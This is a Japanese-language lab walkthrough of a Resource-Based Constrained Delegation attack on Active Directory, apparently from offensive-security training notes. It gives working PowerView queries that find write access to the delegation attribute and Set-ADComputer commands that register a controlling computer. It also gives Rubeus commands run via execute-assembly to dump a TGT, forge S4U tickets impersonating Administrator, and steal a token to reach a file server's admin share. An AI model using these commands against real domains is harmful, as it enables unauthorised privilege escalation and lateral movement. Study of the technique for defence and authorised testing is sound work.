バックエンド側が「誰から委任を受けるか」を定義できる。
バックエンドのサービスアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性をフロントエンドサービスを定義することで制御する。

#### 設定のイメージ
```
従来:
    lon-ws-1 →「lon-fs-1のCIFSに委任できる」
    （フロントエンドが宣言）

RBCD:
    lon-fs-1 →「lon-ws-1からの委任を受け入れる」
    （バックエンドが宣言）
```

以下の条件が満たされるとRBCDを利用して任意のコンピュータへのアクセス権を取得可能
- コンピュータオブジェクトのmsDS-AllowedToActOnBehalfOfOtherIdentity属性への書き込みアクセス権を持っている
- SPNが設定されている別のプリンシパルを支配している（委任元として登録するアカウントが必要）

### 条件1: 書き込み権限探し
'ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity' and discover that its GUID is `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`

PowerViewクエリを使用してドメイン内のDACLから各ACLを読み取り、AcyTypeがGUIDで書き込み権限を持っているものを出力
```powershell
# ①PowerViewの読み込み
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1

# ②資格情報の取得
$Cred = Get-Credential CONTOSO\rsteel

# ③メインのクエリ
Get-DomainComputer        # ドメイン内の全コンピューターを取得
| Get-DomainObjectAcl     # 各コンピューターのACLを取得
| ? {                     # 以下の条件でフィルタ
    $_.ObjectAceType -eq '`3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`'  # 条件A
    -and
    $_.ActiveDirectoryRights -Match 'WriteProperty'  # 条件B
}
| select ObjectDN,SecurityIdentifier  # 必要な列だけ表示
```

出力されたSIDに対してどのユーザとグループに属しているものか確認
```powershell
Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 10.10.120.1 -Credential $Cred
```

### 条件2:SPNに紐づいたアカウントの入手方法
すべてのDelegationはSPNを持つアカウントでのみ設定可能

- 方法1: SYSTEM権限を持っている場合、それらのコンピュータアカウントも使用可能（全コンピュータにはHOST, RestrictedKrbHost, TERAMSRV, WSMANなどのデフォルトのSPNが備わっている

- 方法2:サービスアカウントは、Kerberoastingなどの攻撃によって認証情報を入手した場合に使用可能

 - 方法3:Active Directoryには、ユーザーがドメイン内で作成できるコンピューターアカウントの数を制御するmsDS-MachineAccountQuotaという属性があり、 [StandIn](https://github.com/FuzzySecurity/StandIn)などのツールを使用して偽のコンピュータを作成可能

## アタックケース
現状のRBCD確認
```powershell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount
```
```
Name        PrincipalsAllowedToDelegateToAccount
────        ────────────────────────────────────
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1}   ← 既にlon-ws-1が登録されている
LON-WKSTN-1 {}
LON-WKSTN-2 {}
```

> [!IMPORTANT]
> lon-fs-1 には既に lon-ws-1（コンピューターアカウント）が入っている
> ADのプロパティコレクションは同じ型しか混在できない
>    コンピューターアカウント → コンピューターアカウントのみ
>    ユーザーアカウント      → ユーザーアカウントのみ
>    
> → mssql_svc のようなユーザーアカウントは追加不可 ❌
> → コンピューターアカウントを使うしかない

lon-wkstn-1$を委任元として追加
```powershell
# 既存エントリを変数に保存（上書き防止のため）
$ws1   = Get-ADComputer -Identity 'lon-ws-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1'

# 両方まとめて設定
Set-ADComputer -Identity 'lon-fs-1'
    -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1
```

LON-WKSTN-1$のTGTを取得
```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

S4USelf -> S4UProxy実行
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap
```

チケットを使用してアクセス
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==
```

```
steal_token <PID>
ls \\lon-fs-1\c$
```

